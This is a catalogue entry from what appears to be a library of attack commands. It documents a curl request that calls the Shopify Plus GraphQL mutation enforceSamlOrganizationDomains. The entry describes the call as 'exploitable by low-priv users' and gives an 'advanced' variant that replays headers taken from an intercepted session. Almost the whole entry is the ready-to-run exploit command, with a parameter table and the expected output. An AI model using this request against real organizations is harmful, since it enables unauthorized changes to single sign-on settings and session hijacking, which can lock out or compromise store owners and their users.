---
data: >-
  curl -X POST 'https://shopify.plus/34946971/stores/api' -H 'Content-Type:
  application/json' -H 'Authorization: Bearer YOUR_TOKEN' -d '{"query":"mutation
  {
  enforceSamlOrganizationDomains(domainIds:[\"gid://shopify/OrganizationDomain/123\"])
  { userErrors{message} } }"}'
tags:
  - graphql
  - mutation
  - saml
  - shopify-plus
type: command
executor: bash
platforms:
  - Web
id: 69b8e406-55aa-4c25-9046-3f1b0a45d417
created_at: '2025-12-14T17:29:20.173Z'
updated_at: '2025-12-14T17:29:20.173Z'
verified: false
validated: true
submitted: true
---
# graphql-enforce-saml-domains

## Command

```bash
curl -X POST 'https://shopify.plus/34946971/stores/api' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer YOUR_TOKEN' \
  -d '{"query":"mutation { enforceSamlOrganizationDomains(domainIds:[\"gid://shopify/OrganizationDomain/123\"]) { userErrors{message} } }"}'
```

## Description

This command executes the enforceSamlOrganizationDomains GraphQL mutation on Shopify Plus, enforcing SAML domains with a provided ID; exploitable by low-priv users.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP POST method | Yes |
| `https://shopify.plus/34946971/stores/api` | GraphQL endpoint (replace org ID) | Yes |
| `-H 'Content-Type: application/json'` | JSON content type | Yes |
| `-H 'Authorization: Bearer YOUR_TOKEN'` | Bearer token for auth | Yes |
| `-d '{"query":"mutation { enforceSamlOrganizationDomains(domainIds:[\"gid://...\"]) { userErrors{message} } }"}'` | Mutation payload with domain ID | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://shopify.plus/ORG_ID/stores/api' -H 'Content-Type: application/json' -H 'Authorization: Bearer TOKEN' -d '{"query":"mutation { enforceSamlOrganizationDomains(domainIds:[\"DOMAIN_ID\"]) { userErrors{message} } }"}'
```

### Advanced Usage

Include full headers from intercepted session:

```bash
curl -X POST 'https://shopify.plus/ORG_ID/stores/api' -H 'User-Agent: Mozilla/5.0 ...' -H 'Content-Type: application/json' -H 'Authorization: Bearer TOKEN' -d '{"query":"mutation { enforceSamlOrganizationDomains(domainIds:[\"DOMAIN_ID\"]) { userErrors{message} } }"}'
```

## Expected Output

JSON like {"data":{"enforceSamlOrganizationDomains":{"userErrors":[]}}} on success; userErrors array if failed.

## Related

- [[commands/graphql-query-organization-domains]]
- [[procedures/Execute-enforceSamlOrganizationDomains-Mutation]]
